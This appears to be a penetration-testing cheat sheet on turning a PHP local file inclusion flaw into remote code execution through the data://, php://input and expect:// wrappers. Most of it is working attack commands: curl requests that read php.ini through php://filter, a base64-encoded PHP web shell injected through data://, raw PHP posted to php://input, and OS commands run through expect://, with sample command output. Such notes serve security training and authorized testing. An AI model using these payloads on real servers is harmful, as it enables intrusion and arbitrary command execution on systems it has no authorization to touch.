### LFI to RCE — PHP Wrappers

#### Checking PHP Configuration (Required First Step)

Before attempting any wrapper attack, read the PHP config file through the LFI to check what's available.

```ruby
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

Decode and check for `allow_url_include`:

```ruby
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

- Apache config path: `/etc/php/X.Y/apache2/php.ini`
- Nginx config path: `/etc/php/X.Y/fpm/php.ini`

---
---

## data:// Wrapper

The `data://` wrapper inlines PHP code directly in the URL as base64. Requires `allow_url_include = On`.

##### Check availability

```ruby
echo 'BASE64_PHP_INI' | base64 -d | grep allow_url_include
```
	Expected: allow_url_include = On

Step 1 — Base64-encode a PHP web shell

```ruby
echo '<?php system($_GET["cmd"]); ?>' | base64
```

##### Step 2 — Pass it via the data wrapper

```ruby
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

---
---

## php://input Wrapper

The `php://input` wrapper passes PHP code via the POST body instead of the URL. Requires `allow_url_include = On` and the vulnerable parameter must accept POST requests.

```ruby
echo 'BASE64_PHP_INI' | base64 -d | grep allow_url_include
```
	Expected: allow_url_include = On

#### Execution:

```ruby
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```
- **No URL encoding needed** — the shell is sent as raw POST data, avoiding URL length limits.
- If the parameter only accepts POST and not GET, embed the command directly in the PHP code instead of using `$_GET["cmd"]`:

```ruby
curl -s -X POST --data '<?php system("id"); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input"
```

---
---

## expect:// Wrapper

The `expect://` wrapper executes OS commands directly via URL streams with no web shell required. It is an **external extension** that must be manually installed on the server — it is not enabled by default.

Check availability

```ruby
echo 'BASE64_PHP_INI' | base64 -d | grep expect
```
	Expected: extension=expect
> Finding `extension=expect` in `php.ini` does not guarantee it works at runtime — it can fail to load for other reasons. Always confirm with a live test.

Confirm with a live test

```ruby
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
```

Execution

```ruby
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```
	uid=33(www-data) gid=33(www-data) groups=33(www-data)


